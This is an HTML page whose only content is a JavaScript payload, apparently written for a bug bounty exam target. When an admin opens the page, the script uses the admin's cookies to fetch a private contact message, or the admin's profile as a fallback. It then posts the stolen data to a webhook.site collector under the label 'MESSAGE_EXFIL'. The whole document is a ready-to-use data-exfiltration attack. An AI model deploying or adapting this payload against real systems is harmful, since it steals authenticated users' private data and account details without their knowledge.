<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
        const base = "https://api-bugbounty-exam.hashacademy.co";
        const msgId = "69ea3f53bee6d6b7c66457d3";

        // Attempt to fetch the admin's view of this specific message
        fetch(`${base}/api/v1/contact/messages/${msgId}`, { credentials: "include" })
            .then(r => r.json())
            .then(data => {
                fetch(webh, {
                    method: "POST",
                    body: JSON.stringify({ type: "MESSAGE_EXFIL", payload: data })
                });
            })
            .catch(err => {
                // Fallback to general admin profile if message fetch fails
                fetch(`${base}/api/v1/auth/me`, { credentials: "include" })
                    .then(r => r.text())
                    .then(d => fetch(webh, { method: "POST", body: d }));
            });
    </script>
</body>
</html>
